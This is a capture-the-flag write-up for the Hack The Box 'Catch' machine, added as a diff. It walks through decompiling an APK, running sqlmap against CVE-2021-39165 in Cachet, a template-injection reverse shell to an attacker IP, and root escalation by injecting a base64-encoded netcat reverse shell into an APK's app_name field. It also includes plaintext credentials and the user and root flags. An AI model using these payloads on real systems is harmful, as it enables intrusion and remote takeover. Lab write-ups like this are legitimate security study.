@@ -1,0 +1,88 @@
+On the apk downloaded from the webapp i found another website called "status.catch.htb" & added to /etc/hosts
+
+        ### d2j-dex2jar catchv1.0.apk ###
+
+        ### jd-gui ### and select the .jar generated from the apk file
+                here the /com/MainActivity.class shows the URL
+
+On the new Url the "Cachet" framework was being used, & on port 8000 i confirmed
+
+the CVE-2021-39165 is a functional exploit for this machine so i used sqlmap to exploit it
+
+        ### sqlmap -u "http://status.catch.htb:8000/api/v1/components?name=1&1[0]=&1[1]=a&1[2]=&1[3]=or+%27a%27=%3F%20and%201=1)*+--+">
+                available databases [5]:
+                [*] cachet
+                [*] information_schema
+                [*] mysql
+                [*] performance_schema
+                [*] sys
+
+The sqlinjection is taking tooooo long so going to look on other port & found "lets-talk" on 5000 and in the apk comes a token. Lucky for me the token works :)
+
+        ### curl -kis -H "Authorization: bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0Mz>
+
+Aaand there is one credential found on this port
+        john :  E}V!mywu_69T4C}W
+
+	### curl -kis -H "Authorization: bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0Mz>
+
+
+This credential helped me to login on port "8000" and the next thing to do is to create a reverse web shell on "incident templates"
+
+        ### {{"bash -c 'sh -i >& /dev/tcp/10.10.14.148/9002 0>&1'"]|filter("system")|join(",")}} ###
+
+Now i have a reverse web shell, the next thing to do is a usrPriv escalation
+
+Execute the "env" command to get the system variables and there we found the DB password that is also the user password
+	s2#4Fg0_%3!
+
+access to ssh and there is the user flag :D
+	### ssh will@10.10.11.150 ###
+
+For the rootPriv escalation i found that root was executing a file in /opt/mdm/verify.sh. Analizyng that file i found that modyfing the
+apk downloaded at the beggining i could get a reverse shell with root privileges
+
+
+Executable code:
+
+app_check() {
+	APP_NAME=$(grep -oPm1 "(?<=<string name=\"app_name\">)[^<]+" "$1/res/values/strings.xml")  #Here is were i can manipulate the code
+	echo $APP_NAME
+	if [[ $APP_NAME == *"Catch"* ]]; then
+		echo -n $APP_NAME|xargs -I {} sh -c 'mkdir {}'
+		mv "$3/$APK_NAME" "$2/$APP_NAME/$4"
+	else
+		echo "[!] App doesn't belong to Catch Global"
+		cleanup
+		exit
+	fi
+}
+
+On the apk change the /res/values/strings.xml code (leave everything as it is, only change "name='app_name'" part):
+
+  <string name="app_name">Catch; echo  base64 shell code | base64 -d | bash -i </string>
+
+The base64 reverse shell:
+
+	cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTQuMTQ4IDEyMzQgPi90bXAvZgo=
+
+Compile the apk and move it to the victim machine, with nc or wget
+
+Victim machine:
+	### wget http://10.10.14.148/file.apk ###
+Attacker machine with sudo privileges:
+	### apktool b catchv1.0 -o file.apk ### This is to compile the apk
+	### python -m http.server 80 ###
+
+On the victim machine move the file to /opt/mdm/apk_bin
+	
+	### mv file.apk /opt/mdm/apk_bin ###
+
+Start a nc listener on attacker machine
+	
+	### nc -lvnp 1234 ###
+
+wait a few minutes aaaand finaly root reverse shell. :)
+
+User-Flag: bf6649b87710c11652a13d9776345517
+Root-Flag: 5c9a681148f98ea759e4bbf952141a77
